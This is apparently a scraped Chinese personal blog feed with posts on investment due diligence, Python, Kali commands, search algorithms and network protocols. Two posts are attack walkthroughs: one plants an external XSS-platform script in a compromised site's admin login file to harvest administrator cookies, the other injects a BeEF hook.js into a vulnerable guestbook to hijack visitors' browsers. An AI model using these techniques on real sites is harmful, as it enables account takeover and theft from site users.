八、分析八个数据（1.总资产周转率、2资产负债率、3.流动比率、4.应收帐款周转天数（应收帐款周转率）、5、销售毛利率、6.净值报酬率、7.经营活动净现金流、8、市场占有率） 在厘清四个指标的基础上，我们很有必要分析以下八个数据，是我们对目标企业的深度分析、判断。 资产周转率：表示多少资产创造多少销售收入，表明一个公司是资产（资本）密集型还是轻资产型。该项指标反映资产总额的周转速度，周转越快，反映销售能力越强，企业可以通过薄利多销的办法，加速资产的周转，带来利润绝对数的增加。计算公式：总资产周转率=销售收入÷平均总资产 资产负债率：资产负债率是负债总额除以资产总额的百分比，也就是负债总额与资产总额的比例关系。资产负债率反映在总资产中有多大比例是通过借债来筹资的，也可以衡量企业在清算时保护债权人利益的程度；资产负债率的高低，体现一个企业的资本结构是否合理。计算公式：资产负债率=（负债总额÷资产总额）×100% 流动比率：流动比率是流动资产除以流动负债的比例，反映企业的短期偿债能力。流动资产是最容易变现的资产，流动资产越多，流动负债越少，则短期偿债能力越强。计算公式：流动比率=流动资产÷流动负债 应收帐款周转天数（应收帐款周转率）：应收帐款周转率反映应收帐款的周转速度，也就是年度内应收帐款转为现金的平均次数。用时间表示的周转速度是应收帐款周转天数，也叫平均收现期，表示自企业从取得应收帐款的权利到收回款项，转换为现金所需要的时间。一般来说，应收帐款周转率越高、平均收帐期越短，说明应收帐款收回快。否则，企业的营运资金会过多地呆滞在应收帐款上，影响正常的资金周转。计算公式：应收帐款周转率=销售收入÷平均应收帐款；应收帐款周转天数=360÷应收帐款周转率 销售毛利率：销售毛利率,表示每一元销售收入扣除销售产品或商品成本后,有多少钱可以用于各期间费用和形成利泣,是企业销售净利率的最初基础,没有足够大的毛利率便不能盈利。计算公式：销售毛利率=（销售收入-销售成本）÷销售收入）×100%。 净值报酬率：净值报酬率是净利润与平均股东权益（所有者权益）的百分比，也叫股东权益报酬率。该指标反映股东权益的收益水平。计算公式：净值报酬率=（净利润÷平均股东权益）×100% 经营活动净现金流：经营活动净现金流，是企业在一个会计期间（年度或月份，通常指年度）经营活动产生的现金流入与经营活动产生的现金流出的差额。这一指标说明经营活动产生现金的能力，企业筹集资金额根据实际生产经营需要，通过现金流量表，可以确定企业筹资总额。一般来说，企业财务状况越好，现金净流量越多，所需资金越少，反之，财务状况越差，现金净流量越少，所需资金越多。一个企业经营净现金流量为负，说明企业需筹集更多的资金满足于生产经营所需，否则企业正常生产经营难以为继。 市场占有率：市场占有率，也可称为“市场份额”是企业在运作的市场上所占有的百分比，是企业的产品在市场上所占份额，也就是企业对市场的控制能力。企业市场份额的不断扩大，可以使企业获得某种形式的垄断，这种垄断既能带来垄断利润又能保持一定的竞争优势。当一个企业获得市场25%的占有率时，一般就被认为控制了市场。市场占有率对企业至关重要，一方面它是反映企业经营业绩最关键的指标之一，另一方面它是企业市场地位最直观的体现。市场占有率是由企业的产品力、营销力和形象力共同决定的。 九、走好九个程序（1收集资料+2高管面谈+3企业考察+4竞争调查+5供应商走访+6客户走访+7协会走访+8政府走访+9券商咨询） 要做好一个投资项目，我们有很多程序要走，而且不同的目标企业所采取的程序应该有所不同、分别对待，但是以下就个程序是应该坚持履行的。 收集资料：通过多种形式收集企业资料； 高管面谈：高管面谈，是创业投资的一个初步环境也是非常重要的环节。依据过往经验，往往能很快得出对目标企业业务发展、团队素质的印象。有时一次高管接触，你就不想再深入下去了，因为印象不好。第一感觉往往很重要，也比较可靠。 企业考察：对企业的经营、研发、生产、管理、资源等实施实地考察；对高管以下的员工进行随机或不经意的访谈，能够得出更深层次的印象或结论。 竞争调查：梳理清楚该市场中的竞争格局和对手的情况。通过各种方式和途径对竞争企业进行考察、访谈或第三方评价；对比清楚市场中的各种竞争力量及其竞争优劣势。对竞争企业的信息和对比掌握得越充分、投资的判断就会越准！ 供应商走访：了解企业的采购量、信誉，可以帮助我们判断企业声誉、真实产量；同时也从侧面了解行业竞争格局； 客户走访：可以了解企业产品质量和受欢迎程度，了解企业真实销售情况，了解竞争企业情况；同时，客户自身的档次和优质情况也有助于判断企业的市场地位、以及市场需求的潜力和可持续程度。 协会走访：了解企业的行业地位和声誉，了解行业的发展态势； 政府走访：了解企业的行业地位和声誉，了解政府对企业所处行业的支持程度； 券商咨询：针对上市可行性和上市时间问题咨询券商，对我们判断企业成熟度有重要作用。 十、报告 十个内容（1 企业历史沿革2企业产品与技术3行业分析（机会与威胁） 4企业优势及不足 5发展规划6股权结构 7高管结构 8财务分析 9融资计划 10投资意见） 《尽职调查报告》是创业投资业务的基本功，是对前期工作的总结，是最终决策依据。写好《尽职调查报告》，至少应报告以下10个方面的主要内容。 企业历史沿革：股权变动情况，重大历史事件等； 企业产品与技术：公司业务情况、技术来源； 行业分析：行业概况、行业机会与威胁，竞争对手分析； 优势和不足：企业有哪些优势，哪些是核心竞争力；存在不足或缺陷，有无解决或改进办法； 发展规划：企业的近期、中期的发展规划和发展战略；以及发展规划的可实现性； 股权结构：股权结构情况，合理性分析； 高管结构：高管人员和技术人员背景情况，优势、劣势分析； 财务分析：近年各项财务数据或指标情况及分析； 融资计划：企业发展计划和融资计划及融资条件； 投资意见：投资经理对项目的总体意见或建议。 “厨师炒菜，各有各法。”每家创业投资团队都有自己看项目的办法，创东方的投资要诀只是其中的一种而已。","categories":[{"name":"理财投资","slug":"理财投资","permalink":"https://xiaowuyoucy.github.io/categories/理财投资/"}],"tags":[{"name":"理财，投资","slug":"理财，投资","permalink":"https://xiaowuyoucy.github.io/tags/理财，投资/"}]},{"title":"Python笔记","slug":"201905262134","date":"2019-05-26T13:46:01.000Z","updated":"2019-05-26T14:03:39.803Z","comments":true,"path":"2019/05/26/201905262134/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/05/26/201905262134/","excerpt":"","text":"Python是荷兰著名的“龟叔”Guido van Rossum在1989年圣诞节期间，为了打发无聊的圣诞节而编写的一个编程语言，现在，全世界差不多有600多种编程语言，但流行的编程语言也就那么20来种。如果你听说过TIOBE排行榜，你就能知道编程语言的大致流行程度。这是最近10年最常用的10种编程语言的变化图： 总的来说，这几种编程语言各有千秋。C语言是可以用来编写操作系统的贴近硬件的语言，所以，C语言适合开发那些追求运行速度、充分发挥硬件性能的程序。而Python是用来编写应用程序的高级编程语言，当你用一种语言开始作真正的软件开发时，你除了编写代码外，还需要很多基本的已经写好的现成的东西，来帮助你加快开发进度。比如说，要编写一个电子邮件客户端，如果先从最底层开始编写网络协议相关的代码，那估计一年半载也开发不出来。高级编程语言通常都会提供一个比较完善的基础代码库，让你能直接调用，比如，针对电子邮件协议的SMTP库，针对桌面环境的GUI库，在这些已有的代码库的基础上开发，一个电子邮件客户端几天就能开发出来。 Python就为我们提供了非常完善的基础代码库，覆盖了网络、文件、GUI、数据库、文本等大量内容，被形象地称作“内置电池（batteries included）”。用Python开发，许多功能不必从零编写，直接使用现成的即可；除了内置的库外，Python还有大量的第三方库，也就是别人开发的，供你直接使用的东西。当然，如果你开发的代码通过很好的封装，也可以作为第三方库给别人使用。 许多大型网站就是用Python开发的，例如YouTube、Instagram，还有国内的豆瓣。很多大公司，包括Google、Yahoo等，甚至NASA（美国航空航天局）都大量地使用Python；龟叔给Python的定位是“优雅”、“明确”、“简单”，所以Python程序看上去总是简单易懂，初学者学Python，不但入门容易，而且将来深入下去，可以编写那些非常非常复杂的程序。 总的来说，Python的哲学就是简单优雅，尽量写容易看明白的代码，尽量写少的代码。如果一个资深程序员向你炫耀他写的晦涩难懂、动不动就几万行的代码，你可以尽情地嘲笑他。 那Python适合开发哪些类型的应用呢？ 首选是网络应用，包括网站、后台服务等等； 其次是许多日常需要的小工具，包括系统管理员需要的脚本任务等等； 另外就是把其他语言开发的程序再包装起来，方便使用。 最后说说Python的缺点。 任何编程语言都有缺点，Python也不例外。优点说过了，那Python有哪些缺点呢？ 第一个缺点就是运行速度慢，和C程序相比非常慢，因为Python是解释型语言，你的代码在执行时会一行一行地翻译成CPU能理解的机器码，这个翻译过程非常耗时，所以很慢。而C程序是运行前直接编译成CPU能执行的机器码，所以非常快。 但是大量的应用程序不需要这么快的运行速度，因为用户根本感觉不出来。例如开发一个下载MP3的网络应用程序，C程序的运行时间需要0.001秒，而Python程序的运行时间需要0.1秒，慢了100倍，但由于网络更慢，需要等待1秒，你想，用户能感觉到1.001秒和1.1秒的区别吗？这就好比F1赛车和普通的出租车在北京三环路上行驶的道理一样，虽然F1赛车理论时速高达400公里，但由于三环路堵车的时速只有20公里，因此，作为乘客，你感觉的时速永远是20公里。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"Python教程","slug":"Python教程","permalink":"https://xiaowuyoucy.github.io/tags/Python教程/"},{"name":"Python笔记","slug":"Python笔记","permalink":"https://xiaowuyoucy.github.io/tags/Python笔记/"}]},{"title":"XSS-Cookie维持权限应用","slug":"201904232243","date":"2019-04-23T14:44:01.000Z","updated":"2019-04-24T05:19:22.541Z","comments":true,"path":"2019/04/23/201904232243/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/23/201904232243/","excerpt":"","text":"Cookie维持权限应用 条件： 1.已经获取网站webshell权限 2.网站后台目录文件有可写权限 漏洞原理： 利用js代码获取每次登陆成功的用户Cookie（管理员权限） 接下来我们演示一下，这个过程，这里我首先注册一下配置一下XSS平台 推荐大家到 https://xsspt.com 是个免费不错的XSS测试利用平台， 注册好之后我们添加项目，如下图所示配置： 填写完信息之后点击下一步 勾选上这几项，之后点击下一步，就配置完成XSS基本的测试了， 之后找到该项目的测试代码。 将如下代码植入怀疑出现xss的地方（注意’的转义），即可在 项目内容 观看XSS效果。 1&lt;script src=https://xsspt.com/9f6glg&gt;&lt;/script&gt; 把该代码嵌入到你要维权的后台登陆的那个配置文件即可，这里我就搭建一个本地测试， 我找到该项目后台的配置文件， 用编辑的方式打开，把刚才XSS测试的代码复制进去，之后点击关闭保持， 好，做完这步操作之后，我们来测试一下，假设现在管理员登陆后台，我们看看能不能通过， 刚才的手段获取到我们想要的信息， 登陆进来了，我们这时再回到XSS平台点击项目，看看有没有接收到管理员登陆的Cookie和其他一些相关信息， 看这里已经实时的把管理员登陆的Cookie和其他一些相关信息接收过来了，这些都是很常见的一些， Cookie维权方式之一吧。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://xiaowuyoucy.github.io/tags/XSS/"},{"name":"Cookie","slug":"Cookie","permalink":"https://xiaowuyoucy.github.io/tags/Cookie/"}]},{"title":"beef劫持客户端浏览器","slug":"201904250308","date":"2019-04-23T14:44:01.000Z","updated":"2019-05-07T13:59:05.919Z","comments":true,"path":"2019/04/23/201904250308/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/23/201904250308/","excerpt":"","text":"kali linux里集合了beef劫持客户端浏览器的工具，beef是比较著名的一个xss利用框架， 它是基于web界面的交换方式友好，高度集成，开源的一个项目！和国外其他渗透测试项目一样，它也可以和其他很多工具结合使用，如MSF。 使用方法： 打开kali linux 打开终端搜索 find / -name beef root@kali:~# find / -name beef /usr/share/beef-xss/beef /usr/share/python-faraday/plugins/repo/beef find: ‘/run/user/130/gvfs’: 权限不够 root@kali:~# ^C root@kali:~# find搜索到beef的所在路径，我们需要切换到beef的所在目录将其启动即可 cd /usr/share/beef-xss 切换到beef所在目录 ./beef 启动运行 启动之后beef会有详细的参数地址给出，如下图： Hook URL: http://192.168.1.115:3000/hook.js hook是一个利用的js外链，每当XSS攻击执行该行js代码之后就会被触发 UI URL: http://192.168.1.115:3000/ui/panel 这是beef的控制端，每当hook被触发之后beef控制端就能控制客户端的一系列浏览器活动信息，比如Cookie和转跳，恶意下载木马链接等等操作。 我们把beef的利用代码 http://192.168.1.115:3000/hook.js 以js脚本的方式提交在有xss利用漏洞的留言板上， 每当客户端的浏览器访问即触发beef的利用代码，beef服务端上线达到控制客户端的浏览器权限 我们模拟一下客户端访问浏览器，这是会触发beef的恶意代码，我们可以看到如下的gif，beef的服务器可以，进行客户端浏览器的操作，转跳 ,下载，盗取cookie等… 结合beef 可以进行很多漏洞利用的操作，这就是beef的强大之处吧。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://xiaowuyoucy.github.io/tags/XSS/"},{"name":"beef劫持","slug":"beef劫持","permalink":"https://xiaowuyoucy.github.io/tags/beef劫持/"}]},{"title":"KaliLinux-Bash命令","slug":"201904212314","date":"2019-04-22T12:32:18.000Z","updated":"2019-04-27T10:31:11.766Z","comments":true,"path":"2019/04/22/201904212314/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/22/201904212314/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879ls -l 显示当前目录的文件信息,大小以字节显示ls -lh 显示当前目录的文件信息,大小以KBls -lh --sort=size 当前文件目录按大小顺序排序ls -a 显示当前目录的隐藏文件ls -lh --sort=time 按时间排序，最新修改的排最上cd 进入某个目录和Windows的cd一样pwd 查看当前工作目录clean 清屏cat /var/log/messages 查看文本文件more /var/log/messages 显示一屏的内容，以百分比的显示，当看完一屏可以回车看下一屏tail -20 /var/log/messages 查看文本文件最后的20行内容watch -n 2 tail -20 /var/log/messages 查看文本文件最后的20行内容,每各两秒实时刷新一次当前文件文本信息mkdir+要创建的文件名touch &#123;a,b,c&#125;.txt 创建3个名为a,b,c.txt的文本cp -r test/zwj/ 将 test整个目录拷贝到 zwj下mr+文件名 执行删除功能的命令cp+要拷贝的文件+拷贝后的新文件名cp -r 文件目录名/ 新文件目录名 拷贝目录文件mr -rf 文件目录名 删除拷贝目录top 监测性能信息进程信息等kill PID 结束进程的作用ps aux 显示进程项目信息grep ssh /ext/passwd 查看passwd文件含有ssh字符串的信息ifconfig eth0 down 将网卡卸掉ifconfig eth0 up 启动网卡netstat -pantu 查看产生的TCP/UDP交互网络链接信息netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; 含有0.0.0和::: 被过滤掉不显示出来netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; 以netstat 的信息 输出第五列的信息netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 行内进行分块 只显示第一块netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort 行内进行分块 只显示第一块 对查出来的内容进行排序netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort | uniq 行内进行分块 只显示第一块 对查出来的内容进行排序，之后过滤重复的内容netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort | uniq &gt; ip 行内进行分块 只显示第一块 对查出来的内容进行排序，之后过滤重复的内容 导出到IP文本mount 挂载文件dmesg 查看messages 文件内容find / -name nmap 从根目录开始查找，叫nmap的文件find . -name &quot;ps*&quot; 当前目录下 ps开头的都查找出来find . -name &quot;ps*&quot; -exec cp &#123;&#125; /tmp/&#123;&#125;.bak \\; 当前目录下 ps开头的都查找出来 之后以.bak格式拷贝到tmp目录下whereis + 文件名 查看功能, 在使用whereis 之前先使用updatadb更新一下搜索的数据库，这样的话查找得更多的内容whereis + 文件名 -b 查看文件的二进制文件存放文件","categories":[{"name":"KaliLinux","slug":"KaliLinux","permalink":"https://xiaowuyoucy.github.io/categories/KaliLinux/"}],"tags":[{"name":"Kalinux","slug":"Kalinux","permalink":"https://xiaowuyoucy.github.io/tags/Kalinux/"}]},{"title":"拉格狼日查找算法","slug":"20190410250","date":"2019-03-30T21:08:18.000Z","updated":"2019-04-09T19:17:31.567Z","comments":true,"path":"2019/03/31/20190410250/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/03/31/20190410250/","excerpt":"","text":"拉格狼日查找算法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding=utf-8'''Created on 2019-03-31@author: Administrator'''import timedef costTime(func): def _costTime(finddata,findlist): starttime=time.time() func(finddata,findlist) endtime=time.time() print(endtime-starttime) return _costTime@costTimedef search(finddata,findlist): for data in findlist: if data==finddata: print(\"find\",data) return print(\"not find\")@costTimedef search2(finddata,findlist): low=0 #第一个 high=len(findlist)-1 #代表最后一个 times=0 while low&lt;=high: #不能重叠 times+=1 print(\"times\",times) mid=(low+high)//2 #取出中间索引 middata=findlist[mid] #取出中间数据 if finddata &lt;middata: #小于 淘汰1半 high =mid-1 elif finddata &gt;middata: #小于 淘汰1半 low =mid+1 else: print(\"find\",finddata,mid) return mid print(\"not find\") return -1@costTimedef search2lr(finddata,findlist): low=0 #第一个 high=len(findlist)-1 #代表最后一个 times=0 while low&lt;=high: #不能重叠 times+=1 print(\"times\",times) #mid=(low+high)//2 #取出中间索引 #mid= int( low +(high-low)* 0.5) datamid=((finddata-low)/(high-low)) #datamid=0.5 mid = int(low + (high - low) * datamid) middata=findlist[mid] #取出中间数据 if finddata &lt;middata: #小于 淘汰1半 high =mid-1 elif finddata &gt;middata: #小于 淘汰1半 low =mid+1 else: print(\"find\",finddata,mid) return mid print(\"not find\") return -1findlist=[x+0.1 for x in range(100000000)]finddata=98009999while True: finddata=eval(input(\"data\")) search2lr(finddata,findlist) #2.5050623416900635 拉格狼日插值算法 逐步插值，整体来说还是挺简单的，关键在于算法的部分，这里我运用了二维数组的数据结构来存储每次迭代后的新值。角标的循环初看可能有些复杂，自己动手走一遍就会很清楚啦 ，拉格狼日算法效率是二分查找的几十倍。 12345678910111213141516171819202122232425262728#coding=utf-8'''Created on 2019-03-31@author: Administrator'''def Neville(xt,m,n,x): for i in range(1,n): for j in range(1,n): w[i-j][i]=(x-xt[i-j])/(xt[i]-xt[i-j]) m[i][j]=m[i-1][j-1]+w[i-j][i]*(m[i][j-1]-m[i-1][j-1]) for i in range(n): for j in range(0,i+1): if j%n==0: print(\"\\n\") print(' %f' %m[i][j])n = int(input('插入节点个数:'))x = float(input('输入x的值:'))m = [[0 for i in range(n)] for j in range(n)] #创建n*n矩阵w = [[0 for i in range(n)] for j in range(n)]xt = [0]*nfor i in range(n): m[i][0] = float(input('插入第%d个y值：' %(i+1)))for i in range(n): xt[i] = float(input('插入第%d个x值：' %(i+1)))Neville(xt,m,n,x) 下面的是拉格朗日插值算法，十分简单，分享借鉴。 1234567891011121314151617181920212223242526#coding=utf-8'''Created on 2019-09-31@author: Administrator'''def lagrange(x,xt,yt,n): y = 0 for i in range(n): t = 1 for j in range(n): if i!=j: t = t*(x-xt[j])/(xt[i]-xt[j]) y = y+t*yt[i] print(\"结果为：%f\" %y)xt = []yt = []x = float(input(\"插值x；\"))n = int(input(\"节点数目；\"))for i in range(n): xt.append(float(input(\"第%d个x的值\" %(i+1))))for i in range(n): yt.append(float(input(\"第%d个x的值\" %(i+1)))) lagrange(x,xt,yt,n)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"拉格狼日","slug":"拉格狼日","permalink":"https://xiaowuyoucy.github.io/tags/拉格狼日/"}]},{"title":"网络协议","slug":"201503152349","date":"2019-03-15T15:49:08.000Z","updated":"2019-04-14T16:27:14.631Z","comments":true,"path":"2019/03/15/201503152349/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/03/15/201503152349/","excerpt":"","text":"应用层(Applicatio n Layer) 应用层是为操作系统或网络应用程序提供访问网络服务接口，应用层的协议包括：Telnet、FTP、HTTP、SNMP等等…应用层最终的目的不是解决用户各种具体的应用协议，应用层最终的任务是为用户提供服务。 这里说一下应用层的应用进程，应用进程是指正在运行的应用“程序” 而正在运行的程序都会有通讯的进程方式，这里面先涉及到应用程序的端口，应用程序的协议等，一个联网的应用程序，向外 部 通信时会在 自己的数据包的报头添加上端口号，然后在网络层和数据链路层分别添加上IP地址和MAC地址，将整个数据包发送到外网的主机，外网主机发送过来的数据，操作系统根据 端口号，把 相应的数据包发给 对应的 应用程序（通信软件)。而应用进程最终的目的是为了解决具体的应用问题而彼此通信的进程。 互联网应用层应用分布图： 我们来看看，因特网（(Internet ）最基本的三个应用 1.Email ​ 电子邮件客户程序：Outlook Express、foxmail等，这些 ​ 邮件客户程序→邮件服务器1 →邮件服务器2 →…… →目的邮件服务器→目的邮件客户程序 ​ 电子邮件采用的主要协议是POP3和SMTP SMTP:简单邮箱传输协议，用于电子邮件的传递，建立在UDP（也用TCP） 基础上，端口号25。 POP3：邮局协议（第三版），用于邮件管理和用户邮件的存取。建立在TCP基础上，端口号 110。 2.FTP ​ 允许不同的主机间传送文件，面向连接，基于TCP协议的传输程序， 协议拥有该主机的IP地址（主机域名）、账号、密码。 3.万维网（www） ​ 实际上是一个由千千万万个页面组成的信息网索取页面、浏览信息的程序称为浏览器（Browser，如Netscape、Internet Explorer等），浏览器与Web站点之间通过HTTP协议进行通信 HTTP：超文本传输协议用于传输超文本页面到客户机上，建立在TCP基础上，端口号=80。 应用层的通讯 下图是应用层的通讯过程 建立链接的前提是基于物理层开始的，通讯之间通过一列的物理链接设备（无线电波，光纤，双绞线），物理层通过高低电平工作，传输数据时会将高低电平转化成电信号，发送给被接收者，这些高低电平也就是0和1，通过数据链路层(ethenet)将电信号分组,这些0和1组成一串电信号(10101111) 而每一组的电信号都有特定对应的意义，我们都知道计算机最底层运算是二进制0和1， 就好比数据是字母“A” 要发送和接受两个过程之前都必须转化成电信号，计算机会通过某种机制将你要发送的数据“A”打散成电信号传输到接收方，接受方接受到之后会重新把这些电信号重组通过一层一层的的协议解析出数据这组0和1组成的电信号的意思“A” 这是大概的传输原理。 传输数据是必须遵循以太网（ethernet） 规定的 数据传输必须包含以下部分： 一组电信号的构成一个数据包，也叫做“针” 每一数据帧分成：报头head和数据data两部分 head data 头部(head) 是用来描述数据(data)代表的意义 ，头部包含三种信息 发送者/源地址，6个字节 接收者/目标地址，6个字节 数据类型，6个字节 为什么要有头部（head）信息呢？ 很简单是因为发送数据之前是需要明确，发送者，和接收着的，如果没有这些信息又怎么知道发送者是谁，接收者是谁呢？ 这些信息是在以太网报头定义的，以太网规定每一块网卡必须要有一个MAC地址，而这个MAC地址在网卡出厂之前都会被焊上，全世界独一无二的的MAC地址，MAC地址长度为48位二进制数，通常由12位16进制数表示（前六位是厂商编号，后六位是流水线号） 有了MAC地址之后可以满足于局域网内通讯了，局域网通信是基于UDP协议进行的，优点就是无需建立链接，具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信。 但缺点就是，无法避免攻击的，比如：UDP Flood攻击…… UDP的缺点： 不可靠，不稳定 因为UDP没有TCP那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。 基于上面的优缺点，那么： 什么时候应该使用TCP： 当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议。 在日常生活中，常见使用TCP协议的应用如下： 浏览器，用的HTTP FlashFXP，用的FTP Outlook，用的POP、SMTP Putty，用的Telnet、SSH QQ文件传输 ………… 什么时候应该使用UDP： 当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用UDP。 比如，日常生活中，常见使用UDP协议的应用如下： QQ语音 QQ视频 TFTP …… 跨局域网通讯 基于MAC地址方式，只是能够实现到我们在一个网段里通讯，一个数据包在发送到目标地址之前会进行子网掩码,算出是否在一个网段里，如果是同一个网段直接广播方式传输数据即可接收到，否则并不能让我们夸局域网通信，这里还需要涉及到网关，要包数据包发送出外网就必须把包交给网关，网关就好比一个代理人，网关接受到我们要发送出去的包之后，会将包发送给对方的网关，对方的网关将包拆开之后发现头部的信息来源以及接受的目标地址是谁，从而发送给接收者。 所以IP地址加MAC地址就是标识你全世界的这台机器在哪儿，有了这些基础之后并不够，这些基础只能让我们找到机器，假如现在要进行通讯服务，是基于一个软件上的互相的通讯，我要给对方发送信息，假如对方的机器上运行着无数的软件，那么这个包是不知道是哪个客户端的软件发来的数据，为了解决这一问题，在传输层里又出现了TCP/UDP 协议，这两者协议都是基于端口工作的，每个应用程序都对应着唯一的端口号，目前最大端口号为65536，超出范围的是无效端口，1024之前的端口号都是操作系统所用，超过1024之后的都是应用程序在用， 应用层协议开发者可以自己定义，也可以遵循通用的标准，我们的软件应用程序，都运行在应用层，归根结底应用层是产生数据的，产生数据之后会经过这五层协议，发送给接收者， 在应用层会封装头部信息，原MAC地址/目标MAC地址 ,到了传输层封装原端口/目标端口,到了网络层封原IP/目标IP，最后到了数据链路层封了原MAC/目标MAC，最后到了物理层将这些数据包打包成了电信号转换成二进制高低电平，发送给接收方，对方物理层接受到，到了数据链路层之后这些电信号进行成组，解包得到MAC地址，找到MAC地址之后，再往上一层网络层找，找到IP地址，之后到传输层找到端口对应产生数据的应用程序，最后到了对方的应用层，对方得到传输过去的数据。 主机上网过程 域名 Internet采用层次树状结构的命名方法，它使得任何一个连接在Internet上的主机或路由器都有一个唯一的层次结构的名字，即域名（Domain name）。所谓域(Domain)是域名空间中的一个子树。这个域的名字就是这个子树顶部结点的域名，一个域本身又可划分为若干个域(有时也称它们为子域)。例如：edu是标识教育系统的一个大的域，而tsinghua.edu和besti.edu则是edu域中的两个子域。 目前Internet顶级域名分为三大类： 国家顶级域名：采用ISO 3166规定。如cn表示中国，us表示美国等 国际顶级域名：采用int。国际性的组织可在int下注册。 通用顶级域名：如下表所列。 域名 组织类型 域名 组织类型 com 商业机构 firm 公司企业 edu 教育部门 shop 销售公司与企业 gov 政府部门 web 突出万维网服务单位 org 非商业组织 arts 突出文化艺术活动单位 net 网络服务机构 rec 突出逍遥娱乐活动单位 mil 美国军队组织 info 提供信息服务 nom 个人 域名DNS服务系统 在DNS中由域名服务器（DNS Server）完成域名与IP地址的转换过程，这个过程称为域名解析 域名服务器主要分为以下几个： 1．本地域名服务器 2．根域名服务器 3．授权域名服务器 认识URL url的组成部分（unifrom resource locator） 例如：https://www.microsoft.com/china/index.html https:// 这里是代表超文本传输协议，通知microsoft.com服务器显示Web页面 www 代表一个web(万维网) 服务器; Microsoft.com/ 这是装有页面的服务器的域名，或站点服务器名称; China/ 为该服务器上的子目录，就好像我们的文件夹; index.html 是文件夹中的html文件（网页）。 HTTP是如何工作的？ HTTP客户端启动TCP连接(创建套接字) 到服务器, 端口 80。一旦建立连接，浏览器进程和服务器进程就可以通过各自的套接字来访问，http 报文(应用层协议报文) 在浏览器 (http client) 和Web服务器(http server)之间进行交换。 客户端套接字。客户往自己的套接字发送HTTP请求消息，也从自己的套接字接收HTTP响应消息，服务器从自己的套接字接收HTTP请求消息，也往自己的套接字发送HTTP响应消息。 持久性与非持久性 非持久连接和持久连接 HTTP既可以使用非持久连接(non-persistent connection)，也可以使用持久连接(persistent connection)。HTTP/1.0使用非持久连接，HTTP/1.1默认使用持久连接。 非持久性链接： ​ 非持久连接情况下从服务器到客户传送一个Web页面的步骤。假设该页面由1个基本HTML文件和10个JPEG图像构成，而且所有这些对象都存放在同一台服务器主机中。 再假设该基本HTML文件的URL为： http://www.besti.edu.cn/somepath/index.html 下面是具体步骤: 1.HTTP客户初始化一个与服务器主机www.besti.edu.cn中的HTTP服务器的TCP连接。HTTP服务器使用默认端口号80监听来自HTTP客户的连接建立请求。 2.HTTP客户经由与TCP连接相关联的本地套接字发出一个HTTP请求消息。这个消息中包含路径名/somepath/index.html。 2.HTTP服务器经由与TCP连接相关联的本地套接字接收这个请求消息，再从服务器主机的内存或硬盘中取出对象/somepath/index.html，经由同一个套接字发出包含该对象的响应消息。 3.HTTP服务器告知TCP关闭这个TCP连接(不过TCP要到客户收到刚才这个响应消息之后才会真正终止这个连接)。 4.HTTP客户经由同一个套接字接收这个响应消息。TCP连接随后终止。该消息标明所封装的对象是一个HTML文件。客户从中取出这个文件，加以分析后发现其中有10个JPEG对象的引用。 6.给每一个引用到的JPEG对象重复步骤1-4。 持久性链接 持久连接情况下，服务器在发出响应后让TCP连接继续打开着。同一对客户/服务器之间的后续请求和响应可以通过这个连接发送，通常，HTTP服务器在某个连接闲置一段特定时间后关闭它，而这段时间通常是可以配置的。 持久连接分为不带流水线(without pipelining)和带流水线(with pipelining)两个版本。如果是不带流水线的版本，那么客户只在收到前一个请求的响应后才发出新的请求。 HTTP/1.1的默认模式使用带流水线的持久连接。这种情况下，HTTP客户每碰到一个引用就立即发出一个请求，因而HTTP客户可以一个接一个紧挨着发出各个引用对象的请求。服务器收到这些请求后，也可以一个接一个紧挨着发出各个对象。 HTTP规范1.0[RPcl945]和HTTP1.1 [RFC 2616]定义了HTTP消息的格式。HTTP消息分为请求消息和响应消息两类。 68} HTTP请求消息: 12345GET /somedir/page.html HTTP/1.1 Host:www.besti.edu.cn Connection:closeUser-agent:Mozilla/4.0 Accept-language:zh-cn HTTP请求标准格式 Request 附属体不在GET方法中使用，而是在POST方法中使用。 POST方法适用于需由用户填写表单的场合，如往google搜索引擎中填入待搜索的词。用户提交表单后， HEAD方法与GET方法类似，两者的差别只是服务器在对HEAD方法的响应消息中去掉了所请求的对象，其他内容则与对GET方法的响应消息一样。HEAD方法通常用于HTTP服务器软件开发人员进行调试。 POST方法示例 12345678POST /HTTP/1.1Host: www.wrox.comUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)Gecko/20050225 